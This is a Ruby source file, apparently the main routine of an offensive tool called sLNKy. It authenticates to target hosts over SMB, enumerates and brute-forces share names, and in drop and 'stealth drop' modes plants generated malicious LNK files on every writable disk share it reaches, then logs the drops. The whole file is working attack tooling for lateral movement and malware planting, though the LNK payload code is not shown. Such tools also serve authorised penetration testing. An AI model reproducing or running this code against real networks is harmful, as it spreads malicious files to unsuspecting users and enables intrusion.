#!/usr/bin/ruby

require_relative 'requires.rb'

$prompt = Alerts.new()

def sLNKy(config)

	case config.mode
	when :clean

		$prompt.alert("Cleaning LNK files!")
		
		$prompt.incind
		clean_lnks(config)
		$prompt.decind

		
		$prompt.alert("Done cleaning LNK files!")

	when :generate

		$prompt.alert("Generating malicious LNK file!")
		generate_file(config)

	when :brute, :drop, :stealth_drop

		# Initialize targets variable
		config.targets ||= []

		# Generate the malicious lnk
		generate_malicious_lnk(config) unless config.mode == :brute

		# Initializing an array to track dropped links
		config.dropped_lnks = Log.new()

		unless config.targetlist

			# Load hosts into memory
			File::open(config.targetfile) do |tfile|

				tfile.each do |l|

					reg = /\s+|\,+/

					if l =~ reg

						l.split(reg).each {|t| config.targets << t}

					else

						config.targets << l.strip

					end

				end

			end

		else

			config.targets = config.targetlist

		end

		config.targets.each do |host|

			$prompt.alert("Target Host: #{host}", false)

			sclient = nil
			port = nil

			[139, 445].each do |nport|

				port = nport

				begin

					if port == 139

						login_mode = "LANMAN"

					else

						login_mode = "SRVSVC"

					end

					# create simple smb client and attempt to authenticate to host
					sclient = generate_smb_client(host, port, config.creds)
					# $prompt.alert("#{'LOGIN SUCCESS'.green} (Port: #{port})", false, false)
					$prompt.alert(" [LOGIN SUCCESS (#{login_mode})]".green, false, false)
					break

				rescue Rex::Proto::SMB::Exceptions::LoginError => error

					# puts " [LOGIN FALURE]"
					# $prompt.alert("#{'LOGIN FAILED'.red}: #{parse_error_message(error.message)}", false, false)
					# $prompt.alert(" [LOGIN FAILED (Port #{port})]".red, false, false)
					next # port

				rescue SocketError,
							Rex::ConnectionRefused,
							Rex::HostUnreachable,
							Rex::ConnectionTimeout => error

					# $prompt.alert("LOGIN FAILED (Port #{port}): #{parse_error_message(error.message)}", false, false)
					# $prompt.alert(" [LOGIN FAILED (Port #{port})]".red, false, false)
					next # port

				end

			end

			if ! sclient # next host unless sclient

				$prompt.alert(" [LOGIN FAILED]".red, false, false)
				puts
				next

			end

			# enumerate browseable shares
			puts
			$prompt.alert("Enumerating browseable shares", true)
			$prompt.incind()

			shares ||= []
			begin

				if port == 139

					# $prompt.alert("Share Enumeration Mode: LANMAN", true, false)
					shares = sclient.enumerate_browseable_shares()

				else

					# $prompt.alert("Share Enumeration Mode: SRVSVC", true, false)
					# Enumerate using SRVSVC
					shares = srvsvc_enumerate(host, config.creds)

				end

			rescue Rex::Proto::SMB::Exceptions::ErrorCode,
				Timeout::Error => error

				$prompt.alert("Share enumeration failed: #{error.message.gsub(/^.+\:\s/,'')}")

			end

			if shares != []
				$prompt.alert("Done, #{shares.length} share(s) enumerated", true, false)
			else
				$prompt.alert("Done, but no shares were enumerated", true, false)
			end

			$prompt.decind()

			new_shares = []

			# Add user provided share list to share list
			if config.shares

				$prompt.alert("Adding lines from share file to brute list", true, false)

				File.open(config.shares) do |file|
					file.each {|l| new_shares << l.strip}
				end

			end

			new_shares += config.sharelist if config.sharelist

			if new_shares != []

				$prompt.alert("Bruteforcing shares from user provided share list", true)
				new_shares = bruteforce_shares(config, sclient, new_shares)

				$prompt.incind

				if new_shares
					$prompt.alert("Added #{new_shares.length} to share list".green(), true, false)
					shares += new_shares
				else
					$prompt.alert("Bruteforce failed to identify valid shares!", true, false)
				end

				$prompt.decind


			end

			if config.mode == :brute
				$prompt.alert("Bruteforcing finished!", true, false)
				$prompt.alert("Log files will be written if valid shares were discovered", true, false)
			end

			if shares.length < 1
				$prompt.alert("No shares enumerated! No LNK files dropped on #{host}!", true, false)
				next
			end

			unless config.mode == :brute

				$prompt.alert("Dropping links on valid shares", true)
				$prompt.incind

				shares.each do |share|

					next if share.type != :DISK

					
					$prompt.alert("Target share: #{share.name.blue}", false, false)

					# connect to the share
					success, emessage = sclient.safe_connect(share.name)

					unless success
						puts ' [SHARE CONNECT FAILURE]'.red

						$prompt.symbol = '!'
						$prompt.alert(emessage.gsub(/^.+:\s/,''), true, false)
						$prompt.reset!(:symbol)
						
						# puts
						next
					end

					print ' [SHARE CONNECT SUCCESS]'.green
					if config.mode == :drop
						drop_lnk(config, sclient, share)
					elsif config.mode == :stealth_drop
						drop_stealth_lnk(config, sclient, share)
					end

					begin
						sclient.disconnect(share.name)
					rescue => error
						puts "Share disconnect error...continuing on"
					end
					

				end

				$prompt.decind
				puts

			end

		end

	end

	if config.dropped_lnks != [] and config.mode.to_s =~ /drop/i
		
		puts

		Dir::mkdir(config.logdir) unless Dir::entries('.').include?(config.logdir)
		Dir::chdir(config.logdir)

		$prompt.alert("Writing drop log to #{config.lnk_logfile}")
		config.dropped_lnks.write_logfile(config.lnk_logfile)

	else

		$prompt.alert("No LNK files dropped!...exiting")
		puts

	end

end